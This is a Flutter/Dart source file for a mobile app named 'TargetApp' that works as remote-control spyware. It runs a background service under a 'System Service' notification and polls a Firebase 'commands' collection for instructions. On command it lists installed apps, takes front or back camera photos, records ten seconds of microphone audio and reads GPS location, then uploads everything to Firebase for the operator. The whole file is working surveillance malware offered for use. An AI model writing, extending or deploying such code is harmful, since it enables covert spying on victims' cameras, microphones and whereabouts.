
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:camera/camera.dart';
import 'package:record/record.dart';
import 'package:device_apps/device_apps.dart';
import 'package:geolocator/geolocator.dart';
import 'package:path_provider/path_provider.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:permission_handler/permission_handler.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  runApp(MaterialApp(
    home: FutureBuilder(
      future: Firebase.initializeApp(),
      builder: (context, snapshot) {
        if (snapshot.hasError) {
          return Scaffold(
            body: Center(
              child: Padding(
                padding: const EdgeInsets.all(24.0),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.error_outline, size: 64, color: Colors.red),
                    SizedBox(height: 16),
                    Text("فشل الاتصال بـ Firebase", textAlign: TextAlign.center,
                        style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold)),
                    SizedBox(height: 12),
                    SelectableText("${snapshot.error}",
                        textAlign: TextAlign.center, style: TextStyle(color: Colors.grey[700], fontSize: 14)),
                    SizedBox(height: 20),
                    ElevatedButton.icon(
                      icon: Icon(Icons.refresh),
                      label: Text("إعادة المحاولة"),
                      onPressed: () async {
                        // إعادة تشغيل التطبيق
                        runApp(TargetApp());
                      },
                    ),
                  ],
                ),
              ),
            ),
          );
        }
        if (snapshot.connectionState == ConnectionState.done) {
          return TargetApp();
        }
        return Scaffold(body: Center(child: CircularProgressIndicator(strokeWidth: 3)));
      },
    ),
  ));
}

class TargetApp extends StatefulWidget {
  const TargetApp({super.key});
  @override
  _TargetAppState createState() => _TargetAppState();
}

class _TargetAppState extends State<TargetApp> {
  late String deviceId;
  bool initialized = false;

  @override
  void initState() {
    super.initState();
    deviceId = "target_${Random().nextInt(999999).toString().padLeft(6, '0')}";
    initializeServiceAndStart();
  }

  Future<void> initializeServiceAndStart() async {
    await initializeService();
    setState(() {
      initialized = true;
    });
  }

  Future<void> initializeService() async {
    final service = FlutterBackgroundService();
    await service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: onStart,
        autoStart: true,
        isForegroundMode: true,
        notificationChannelId: 'target_channel',
        initialNotificationTitle: 'System Service',
        initialNotificationContent: 'Running in background',
        foregroundServiceNotificationId: 888,
      ),
      iosConfiguration: IosConfiguration(
        autoStart: true,
        onForeground: onStart,
        onBackground: onStart,
      ),
    );
    service.startService();
  }

  @override
  Widget build(BuildContext context) {
    if (!initialized) {
      return Scaffold(
        body: Center(child: CircularProgressIndicator()),
      );
    }
    return MaterialApp(home: TargetScreen(deviceId: deviceId));
  }
}

@pragma('vm:entry-point')
Future<bool> onStart(ServiceInstance service) async {
  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((event) {
      service.setAsForegroundService();
    });
    service.on('setAsBackground').listen((event) {
      service.setAsBackgroundService();
    });
  }
  return true;
}

class TargetScreen extends StatefulWidget {
  final String deviceId;
  const TargetScreen({required this.deviceId});

  @override
  _TargetScreenState createState() => _TargetScreenState();
}

class _TargetScreenState extends State<TargetScreen> {
  bool listening = false;
  final AudioRecorder _recorder = AudioRecorder();

  @override
  void initState() {
    super.initState();
    startListening();
  }

  void startListening() {
    FirebaseFirestore.instance
        .collection('commands')
        .doc(widget.deviceId)
        .snapshots()
        .listen((doc) async {
      if (doc.exists) {
        var data = doc.data() as Map<String, dynamic>;
        String cmd = data['command'] ?? '';
        FirebaseFirestore.instance.collection('commands').doc(widget.deviceId).delete();

        switch (cmd) {
          case 'get_apps':
            await getInstalledApps();
            break;
          case 'camera_front':
            await captureImage('front');
            break;
          case 'camera_back':
            await captureImage('back');
            break;
          case 'record_audio':
            await recordAudio();
            break;
          case 'location':
            await getLocation();
            break;
          default:
            sendResponse({'type': 'error', 'data': 'Unknown command'});
        }
      }
    });
    setState(() { listening = true; });
  }

  void sendResponse(Map<String, dynamic> data) {
    FirebaseFirestore.instance.collection('responses').doc(widget.deviceId).set({
      ...data,
      'timestamp': FieldValue.serverTimestamp(),
    });
  }

  Future<void> getInstalledApps() async {
    try {
      List<Application> apps = await DeviceApps.getInstalledApplications(
        onlyAppsWithLaunchIntent: true,
        includeSystemApps: true,
      );
      List<String> names = apps.map((a) => a.appName).toList();
      sendResponse({'type': 'apps', 'data': names});
    } catch (e) {
      sendResponse({'type': 'error', 'data': 'Apps error: $e'});
    }
  }

  Future<void> captureImage(String direction) async {
    try {
      var status = await Permission.camera.request();
      if (!status.isGranted) {
        sendResponse({'type': 'error', 'data': 'Camera permission denied'});
        return;
      }

      final cameras = await availableCameras();
      CameraDescription? cam;
      if (direction == 'front') {
        cam = cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.front);
      } else {
        cam = cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.back);
      }

      CameraController controller = CameraController(cam!, ResolutionPreset.medium, enableAudio: false);
      await controller.initialize();
      XFile xfile = await controller.takePicture();
      await controller.dispose();

      String downloadUrl = await uploadToFirebase(xfile.path, 'images');
      sendResponse({'type': 'image', 'data': downloadUrl});
    } catch (e) {
      sendResponse({'type': 'error', 'data': 'Camera error: $e'});
    }
  }

  Future<void> recordAudio() async {
    try {
      var status = await Permission.microphone.request();
      if (!status.isGranted) {
        sendResponse({'type': 'error', 'data': 'Microphone permission denied'});
        return;
      }

      if (await _recorder.hasPermission()) {
        final tmpDir = await getTemporaryDirectory();
        final path = '${tmpDir.path}/audio_${DateTime.now().millisecondsSinceEpoch}.m4a';
        await _recorder.start(const RecordConfig(), path: path);
        await Future.delayed(const Duration(seconds: 10));
        await _recorder.stop();

        String downloadUrl = await uploadToFirebase(path, 'audio');
        sendResponse({'type': 'audio', 'data': downloadUrl});
      }
    } catch (e) {
      sendResponse({'type': 'error', 'data': 'Audio error: $e'});
    }
  }

  Future<void> getLocation() async {
    try {
      var status = await Permission.location.request();
      if (!status.isGranted) {
        sendResponse({'type': 'error', 'data': 'Location permission denied'});
        return;
      }
      Position position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );
      sendResponse({
        'type': 'location',
        'data': {'lat': position.latitude, 'lng': position.longitude}
      });
    } catch (e) {
      sendResponse({'type': 'error', 'data': 'Location error: $e'});
    }
  }

  Future<String> uploadToFirebase(String filePath, String folder) async {
    try {
      File file = File(filePath);
      String fileName = filePath.split('/').last;
      Reference ref = FirebaseStorage.instance.ref().child('$folder/$fileName');
      UploadTask uploadTask = ref.putFile(file);
      TaskSnapshot snapshot = await uploadTask;
      String downloadUrl = await snapshot.ref.getDownloadURL();
      return downloadUrl;
    } catch (e) {
      return 'Upload failed: $e';
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('Target - ${widget.deviceId}')),
      body: Center(
        child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
          Text('Device ID:', style: TextStyle(fontSize: 18)),
          SelectableText(widget.deviceId,
              style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold)),
          SizedBox(height: 30),
          Text(listening ? '🟢 Listening for commands...' : '⏳ Initializing...'),
        ]),
      ),
    );
  }
}
